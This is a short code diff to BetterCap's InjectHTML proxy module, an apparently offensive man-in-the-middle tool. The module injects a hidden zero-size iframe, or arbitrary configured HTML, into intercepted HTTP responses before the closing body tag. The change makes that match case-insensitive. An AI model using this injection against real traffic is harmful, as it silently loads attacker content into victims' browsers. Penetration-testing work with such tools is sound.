@@ -55,12 +55,12 @@ class InjectHTML < BetterCap::Proxy::HTTP::Module
       BetterCap::Logger.info "[#{'INJECTHTML'.green}] Injecting HTML code into #{request.to_url}"
 
       if @@data.nil?
-	 replacement = "<iframe src=\"#{@@iframe}\" frameborder=\"0\" height=\"0\" width=\"0\"></iframe></body>"
-        response.body.sub!( '</body>' ) {replacement}
+	      replacement = "<iframe src=\"#{@@iframe}\" frameborder=\"0\" height=\"0\" width=\"0\"></iframe></body>"
       else
-	 replacement = "#{@@data}</body>"
-        response.body.sub!( '</body>' ) {replacement} 
+	      replacement = "#{@@data}</body>"
       end
+
+      response.body.sub!( /<\/body>/i ) { replacement }
     end
   end
 end
